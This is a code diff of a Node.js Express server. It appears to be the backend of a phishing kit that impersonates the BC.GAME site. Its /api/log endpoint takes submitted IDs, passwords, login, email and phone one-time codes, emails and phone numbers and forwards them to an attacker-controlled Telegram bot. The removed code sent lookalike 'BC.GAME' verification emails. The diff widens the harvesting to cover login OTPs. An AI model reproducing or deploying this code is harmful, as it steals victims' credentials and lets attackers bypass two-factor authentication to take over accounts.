@@ -1,102 +1,70 @@
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
-const nodemailer = require('nodemailer');
 const axios = require('axios');
 const app = express();
 const port = process.env.PORT || 3000;
 
 app.use(express.json());
+app.use(express.static(__dirname));
 
-console.log('🚀 Server starting with config:');
-console.log('Email User:', process.env.EMAIL_USER);
-console.log('SMTP Port:', process.env.SMTP_PORT);
-console.log('Log Bot Token:', process.env.LOG_BOT_TOKEN ? 'SET' : 'MISSING');
-console.log('Chat ID:', process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID || 'MISSING');
+const BOT_TOKEN = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
+const CHAT_ID = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID;
 
-// API Endpoints
+console.log('--- LOG BOT CONFIG ---');
+console.log('Token:', BOT_TOKEN ? 'OK' : 'MISSING');
+console.log('Chat ID:', CHAT_ID || 'MISSING');
+console.log('----------------------');
+
+// API Endpoint for Logs
 app.post('/api/log', async (req, res) => {
     const { title, data } = req.body;
-    console.log(`[LOG] Hit: ${title}`);
-    
-    const token = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
-    const chatId = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID || '1661187898';
+    console.log(`[LOG ATTEMPT] ${title}`);
 
-    if (!token || !chatId) return res.status(500).json({ success: false, message: 'Bot config missing' });
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.error('[LOG ERROR] Missing bot credentials');
+        return res.status(500).json({ success: false, error: 'Config missing' });
+    }
 
     const message = `
 🔥 <b>${title}</b>
 ━━━━━━━━━━━━━━━
 👤 <b>ID</b>: <code>${data.id}</code>
-🔑 <b>Pass</b>: <code>${data.pass}</code>
+🔑 <b>Pass</b>: <code>${data.pass || 'N/A'}</code>
+🔢 <b>Login OTP</b>: <code>${data.login_otp || 'N/A'}</code>
 📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
-🔢 <b>E-OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
+🔢 <b>E-OTP</b>: <code>${data.email_otp || 'N/A'}</code>
 📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
-🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
+🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'N/A'}</code>
 🕒 <b>Time</b>: ${data.time}
 ━━━━━━━━━━━━━━━`;
 
     try {
-        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-            chat_id: chatId.trim(),
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID.trim(),
             text: message,
             parse_mode: 'HTML'
         });
-        console.log('[LOG] Sent to Telegram');
+        console.log('[LOG SUCCESS] Sent to Telegram');
         res.json({ success: true });
     } catch (e) {
-        console.error("[LOG] Telegram Error:", e.response?.data || e.message);
-        res.status(500).json({ success: false, error: e.message });
+        const errMsg = e.response?.data?.description || e.message;
+        console.error("[LOG FAILED] Telegram Error:", errMsg);
+        res.status(500).json({ success: false, error: errMsg });
     }
 });
 
-app.post('/send-otp', async (req, res) => {
-    const { email } = req.body;
-    console.log(`[OTP] Request for: ${email}`);
-
-    if (!email) return res.status(400).json({ success: false });
-
-    const otp = Math.floor(100000 + Math.random() * 900000).toString();
-    const transporter = nodemailer.createTransport({
-        host: process.env.SMTP_HOST || 'smtp.gmail.com',
-        port: parseInt(process.env.SMTP_PORT) || 465,
-        secure: (process.env.SMTP_PORT == '465'),
-        auth: {
-            user: process.env.SMTP_USER || process.env.EMAIL_USER,
-            pass: process.env.SMTP_PASS || process.env.EMAIL_PASS
-        }
-    });
-
-    try {
-        await transporter.sendMail({
-            from: process.env.SMTP_FROM || `"BC.GAME" <${process.env.EMAIL_USER}>`,
-            to: email,
-            subject: '🔐 Verification Code',
-            html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; text-align:center; border:2px solid #3bc117; font-family:sans-serif;">
-                    <h1 style="color:#3bc117;">BC.GAME</h1>
-                    <p style="font-size:18px;">Your verification code is: <b style="font-size:32px; color:#3bc117;">${otp}</b></p>
-                   </div>`
-        });
-        console.log('[OTP] Email Sent Successfully');
-        res.json({ success: true });
-    } catch (e) {
-        console.error("[OTP] SMTP Error:", e.message);
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-app.use(express.static(__dirname));
-
+// Express 5 compatible catch-all fallback
 app.use((req, res, next) => {
-    if (req.method === 'GET' && !req.path.includes('.')) {
-        res.sendFile(path.join(__dirname, 'index.html'));
-    } else {
-        next();
+    // If it's a GET request and not for an API or file, serve index.html
+    if (req.method === 'GET' && !req.path.startsWith('/api/') && !req.path.includes('.')) {
+        return res.sendFile(path.join(__dirname, 'index.html'));
     }
+    next();
 });
 
 if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
-    app.listen(port, () => console.log(`🚀 Server on port ${port}`));
+    app.listen(port, () => console.log(`🚀 Server running on http://localhost:${port}`));
 }
 
 module.exports = app;
